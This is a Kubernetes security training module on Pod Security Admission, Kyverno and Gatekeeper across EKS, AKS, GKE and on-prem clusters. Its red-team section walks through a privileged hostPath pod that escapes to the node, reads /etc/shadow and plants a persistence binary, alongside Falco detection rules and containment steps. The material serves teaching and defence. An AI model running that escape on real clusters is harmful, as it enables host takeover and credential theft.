# 07 — Pod Security Admission & PSP Replacements

> **Level:** Intermediate
> **Prereqs:** [K8s Attack Surface Overview](k8s-attack-surface-overview.md) (K8s Attack Surface Overview)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Execution, Privilege Escalation, Defense Evasion (see ATT&CK Containers matrix)
**Authorization scope:** Run locally against a `kind` cluster you own. Cloud commands use placeholder account IDs. No remote exploitation.

## What & why

Pod Security Policies (PSPs) were removed in Kubernetes 1.25. Pod Security Admission (PSA) is the built-in replacement — three standard levels (privileged, baseline, restricted) enforced via namespace labels. For anything beyond the three levels, third-party admission controllers like Kyverno and OPA Gatekeeper fill the gap. Lacking admission control, any authenticated user can launch a privileged pod with `hostPath` mounts and escape to the node.

## The OnPrem reality

Pre-K8s, container security was Docker daemon flags (`--userns-remap`, `--no-new-privileges`) enforced by the operator on each host. PSPs were the first cluster-wide pod security abstraction, but they were complex to author, prone to mutation gaps, and the OPA/Gatekeeper movement proved general-purpose admission control was more flexible. OnPrem self-managed clusters that haven't migrated from PSP to PSA/Kyverno are vulnerable by omission.

## Core concepts

| Concept | Description |
|---|---|
| PodSecurityPolicy (PSP) | Deprecated; removed in K8s 1.25. Cluster-scoped resource controlling pod-level security attributes (privileged, hostPID, volumes, capabilities). |
| Pod Security Admission (PSA) | Built-in K8s 1.25+ admission controller. Three levels: `privileged` (unrestricted), `baseline` (known escalations blocked), `restricted` (best-practice pod hardening). Enforced via `pod-security.kubernetes.io/<mode>` labels on namespaces. |
| PSA modes | `enforce` (reject violating pods), `audit` (log violations only), `warn` (return warning to user). |
| Kyverno | Policy-as-code for K8s; generate, validate, mutate, verify images. OCI-native rule format. |
| OPA Gatekeeper | Rego-based admission controller. ConstraintTemplate + Constraint pattern matches K8s objects against Rego rules. |
| Mutating admission | Controllers that *modify* pod specs on admission (e.g., inject default seccomp profile, set `runAsNonRoot`). |

### PSA levels matrix

| Feature | Privileged | Baseline | Restricted |
|---|---|---|---|
| `hostPID`, `hostIPC` | Allowed | Blocked | Blocked |
| `hostNetwork` | Allowed | Allowed | Blocked |
| `privileged` container | Allowed | Blocked | Blocked |
| `CAP_SYS_ADMIN` | Allowed | Blocked | Blocked |
| HostPath volumes | Allowed | Allowed | Blocked |
| `runAsUser: 0` (root) | Allowed | Allowed | `MustRunAsNonRoot` |
| seccomp profile required | No | No | Yes (RuntimeDefault) |
| Volume types allowed | All | All | ConfigMap, Secret, EmptyDir, CSI, PersistentVolumeClaim, downwardAPI, projected |

## AWS (EKS)

**Enable PSA on a namespace (built-in on EKS 1.25+):**

```bash
# AWS — EKS cluster 1.25+ has PSA enabled by default
kubectl label ns app-team \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted
```

**Install Kyverno via Helm on EKS:**

```bash
# AWS
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno -n kyverno --create-namespace
```

**Kyverno policy — deny privileged pods (EKS-flavored):**

```yaml
# AWS (same policy works on all K8s)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  rules:
    - name: deny-privileged-containers
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Privileged containers are forbidden"
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"
```

**EKS-managed add-on for admission control:** EKS does not ship a built-in admission controller beyond PSA. AWS recommends Kyverno or OPA Gatekeeper for production policy enforcement.

## Azure (AKS)

**Enable PSA on AKS (1.25+):**

```bash
# Azure — label namespace for PSA restricted
kubectl label ns app-team \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted
```

**Azure Policy — built-in admission for AKS:**

```bash
# Azure — enable Azure Policy for AKS
az aks enable-addons \
  --addons azure-policy \
  --name cluster-sec \
  --resource-group rg-sec

# Azure — built-in initiative: "Kubernetes cluster pod security baseline standards"
az policy assignment create \
  --name aks-pod-security \
  --policy-set-definition "a8640138-9b0a-4a28-b8cb-f89b3b8a3d04" \
  --scope /subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-sec
```

**Install Kyverno on AKS:**

```bash
# Azure
az aks get-credentials --resource-group rg-sec --name cluster-sec
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno -n kyverno --create-namespace
```

## GCP (GKE)

**GKE Autopilot defaults to restricted everywhere — no privileged pods possible:**

```bash
# GCP — GKE Standard: label namespace for PSA
kubectl label ns app-team \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted
```

**GKE Policy Controller (built-in Gatekeeper):**

```bash
# GCP — enable Policy Controller on GKE
gcloud container clusters create cluster-sec \
  --zone=us-central1-a \
  --enable-dataplane-v2 \
  --workload-pool=my-sandbox-project.svc.id.goog \
  --release-channel=regular
```

**GKE-enforced pod security via org policy:**

```bash
# GCP
gcloud container fleet policy bindings create \
  --membership=cluster-sec \
  --location=global \
  --policy-binding=projects/my-sandbox-project/locations/global/fleetPolicyBindings/policy-sec
```

**Kyverno on GKE:**

```bash
# GCP
gcloud container clusters get-credentials cluster-sec --zone us-central1-a
helm install kyverno kyverno/kyverno -n kyverno --create-namespace
```

## OnPrem (self-managed)

**PSA built-in since K8s 1.23 (GA):**

```bash
# OnPrem
kubectl label ns app-team \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted
```

**Kyverno install on self-managed:**

```bash
# OnPrem
kubectl apply -f https://github.com/kyverno/kyverno/releases/download/v1.11.0/install.yaml
```

**Gatekeeper install on self-managed:**

```bash
# OnPrem
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml
```

**Admission webhook registration (self-managed gotcha):** Self-managed clusters need the `admissionregistration.k8s.io/v1` API enabled and valid TLS certificates for the webhook endpoint. Managed clusters handle this automatically.

## OnPrem mapping (recap table)

| Concern | OnPrem (self-managed) | AWS (EKS) | Azure (AKS) | GCP (GKE) |
|---|---|---|---|---|
| PSP successor | PSA + Kyverno/Gatekeeper | PSA + Kyverno/Gatekeeper | PSA + Azure Policy / Kyverno | PSA + Policy Controller / Kyverno |
| PSA built-in | Yes (1.23+) | Yes (1.25+) | Yes (1.25+) | Yes (Autopilot = always restricted) |
| Managed admission service | None | None (add-on) | Azure Policy for AKS | GKE Policy Controller |
| Default PSA level | Unset (nil) | Unset (nil) | Baseline (AKS 1.25+) | Restricted (Autopilot); Unset (Standard) |
| Admission webhook TLS | You manage | You manage with cert-manager | You manage with cert-manager | You manage with cert-manager |
| Audit of admission decisions | `kube-apiserver --audit-log-path` | CloudWatch (EKS audit logs) | Azure Monitor (kube-audit) | Cloud Audit Logs (default) |

## 🔴 Red Team view

**Attack: Privileged pod with hostPath mount → node escape on local `kind`**

**Scope:** This example targets a local `kind` cluster only. Every command runs on equipment you own.

**Step 1 — Verify no admission control is blocking privileged pods:**

```bash
kind create cluster --name psa-demo

kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: test-priv
  namespace: default
spec:
  containers:
    - name: escape
      image: alpine
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
EOF

kubectl get pod test-priv
```

**Step 2 — If the pod was created, exec into it and access the host filesystem:**

```bash
kubectl exec -it test-priv -- sh
# Inside the pod:
ls /host/etc/shadow
cat /host/etc/hostname
# The attacker can read any host file and write to /host/usr/bin/ for persistence
```

**Step 3 — Deploy a persistence binary onto the node:**

```bash
# Inside the escaped pod (contained, local only)
cp /bin/busybox /host/tmp/persist
# chroot into the host and execute
# chroot /host /tmp/persist sh
```

**Artifacts left:**
- K8s audit log: `pods/create` with `securityContext.privileged: true` and `volumes[].hostPath.path: /`
- Node filesystem: `/tmp/persist` binary and atime/mtime on `/etc/shadow`
- `kubectl get pods` shows the `test-priv` pod in `Running` state in `default` namespace
- API server: `exec` subresource request against pod `test-priv`

## 🔵 Blue Team view

**Detection signals:**

| Signal | Log Source | Query / Check |
|---|---|---|
| Privileged pod created | K8s audit log | `verb=create resource=pods` with `spec.containers[].securityContext.privileged=true` |
| hostPath `/` mount | K8s audit log | `verb=create resource=pods` with `volumes[].hostPath.path=/` |
| Pod in `default` ns with `privileged: true` | K8s API | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.containers[].securityContext.privileged==true \| .metadata.namespace, .metadata.name)'` |
| `kubectl exec` into non-system namespace | K8s audit log | `verb=create resource=pods/exec subresource=exec` from unexpected user |
| HostPath write detected | Falco | `evt.type=openat and container and fd.name startswith /host/` |

**Falco rule — privileged pod creation:**

```yaml
- rule: Privileged Pod Created
  desc: Detect any pod created with privileged=true
  condition: >
    ka.target.resource=pods and ka.target.subresource="" and
    ka.verb=create and
    ka.target.pod.spec.containers.privileged=true
  output: "Privileged pod created: %ka.target.namespace/%ka.target.name by %ka.user.name"
  priority: CRITICAL
  source: k8s_audit
```

**Falco rule — hostPath mount detection at runtime:**

```yaml
- rule: HostPath Volume Mounted
  desc: Pod using hostPath volume (node escape risk)
  condition: >
    ka.target.resource=pods and ka.verb=create and
    ka.target.pod.spec.volumes.hostpath exists
  output: "hostPath volume mounted in %ka.target.namespace/%ka.target.name (path=%ka.target.pod.spec.volumes.hostpath.path)"
  priority: WARNING
  source: k8s_audit
```

**Preventive controls (PSA + Kyverno):**

```bash
# Enforce PSA restricted on default namespace
kubectl label ns default pod-security.kubernetes.io/enforce=restricted --overwrite

# Kyverno policy — deny hostPath
kubectl apply -f - <<EOF
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-hostpath
spec:
  validationFailureAction: Enforce
  rules:
    - name: block-hostpath
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "hostPath volumes are forbidden"
        pattern:
          spec:
            =(volumes):
              - X(hostPath): null
EOF
```

**Post-incident containment:**

```bash
# 1. Identify all privileged pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {ns: .metadata.namespace, name: .metadata.name}'

# 2. Immediately delete the offending pod
kubectl delete pod test-priv -n default --force --grace-period=0

# 3. Label all user namespaces restricted
kubectl label ns default app-team dev \
  pod-security.kubernetes.io/enforce=restricted --overwrite

# 4. Audit all existing pods for hostPath mounts
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath) | {ns: .metadata.namespace, name: .metadata.name, path: .spec.volumes[].hostPath.path}'
```

## Hands-on lab

**Goal:** Demonstrate that PSA `restricted` blocks privileged pods, then enforce via Kyverno.

**Steps:**
1. `kind create cluster --name psa-lab`
2. Verify no PSA labels on `default` ns: `kubectl get ns default -o json | jq '.metadata.labels'`
3. Create a privileged pod — succeeds: `kubectl apply -f privileged-pod.yaml`
4. Label default ns restricted: `kubectl label ns default pod-security.kubernetes.io/enforce=restricted --overwrite`
5. Delete and recreate the privileged pod — now rejected by PSA: `The Pod "privileged-pod" is invalid: spec.containers[0].securityContext.privileged: Forbidden`
6. Install Kyverno: `helm install kyverno kyverno/kyverno -n kyverno --create-namespace`
7. Apply the `disallow-privileged` ClusterPolicy above.
8. Remove the PSA label to test Kyverno-only enforcement: `kubectl label ns default pod-security.kubernetes.io/enforce-`
9. Recreate the privileged pod — rejected by Kyverno.
10. Teardown: `kind delete cluster --name psa-lab`

**Expected output:** PSA restricted blocks privileged and hostPath. Kyverno provides the same enforcement plus audit mode visibility.

## Detection rules & checklists

**CLI audit one-liners:**

```bash
# All clouds: find pods with hostPath volumes
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath) | "\(.metadata.namespace)/\(.metadata.name) path=\(.spec.volumes[].hostPath.path)"'

# All clouds: find namespaces without PSA labels
kubectl get ns -o json | jq -r '.items[] | select(.metadata.labels | has("pod-security.kubernetes.io/enforce") | not) | .metadata.name'

# Find pods running as root (UID 0)
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.runAsUser==0 or .spec.securityContext.runAsUser==0) | "\(.metadata.namespace)/\(.metadata.name)"'

# All clouds: list privileged containers in running pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | {ns: .metadata.namespace, name: .metadata.name, node: .spec.nodeName}'

# EKS: check CloudWatch for pod create events with privileged
aws logs filter-log-events \
  --log-group-name /aws/eks/cluster-sec/cluster \
  --filter-pattern '{$.objectRef.resource="pods" && $.objectRef.subresource="" && $.verb="create"}' \
  --region us-east-1

# AKS: query kube-audit logs for privileged pods
az monitor activity-log list \
  --namespace Microsoft.ContainerService \
  --query "[?contains(operationName.value, 'pods')]" -o table
# (as of June 2026, use Azure Monitor Logs with `ContainerService` resource provider; query the `AKSAudit` or `AKSAuditAdmin` table in Log Analytics for kube-audit events)

# GKE: audit log query for privileged pod creation
gcloud logging read \
  'resource.type="k8s_cluster" AND protoPayload.authorizationInfo.permission="io.k8s.core.v1.pods.create" AND jsonPayload.spec.containers.securityContext.privileged="true"' \
  --project=my-sandbox-project --limit=20
```

**Gatekeeper `ConstraintTemplate` — deny privileged pods:**

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sDenyPrivileged
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenyprivileged
        violation[{"msg": msg}] {
          input.review.object.spec.containers[_].securityContext.privileged == true
          msg := "Privileged containers are not allowed"
        }
```

**Cloud Custodian policy — detect unlabeled namespaces in EKS:**

```yaml
policies:
  - name: eks-unlabeled-namespace
    resource: aws.eks-cluster
    filters:
      - type: k8s-namespace
        key: "metadata.labels.\"pod-security.kubernetes.io/enforce\""
        value: absent
```

## References

- K8s Pod Security Admission: https://kubernetes.io/docs/concepts/security/pod-security-admission/
- PSP deprecation FAQ: https://kubernetes.io/blog/2021/04/06/podsecuritypolicy-deprecation-past-present-and-future/
- Kyverno docs: https://kyverno.io/docs/
- OPA Gatekeeper: https://open-policy-agent.github.io/gatekeeper/website/docs/
- EKS security best practices (pods): https://aws.github.io/aws-eks-best-practices/security/docs/pods/
- AKS pod security with Azure Policy: https://learn.microsoft.com/en-us/azure/aks/use-pod-security-on-azure-policy
- GKE Policy Controller: https://cloud.google.com/kubernetes-engine/docs/concepts/policy-controller
- ATT&CK Containers: "Execution" via privileged containers
- Cross-links: [`03-05-k8s-attack-surface-overview.md`](k8s-attack-surface-overview.md), [`03-08-container-escape-classes.md`](container-escape-classes.md)
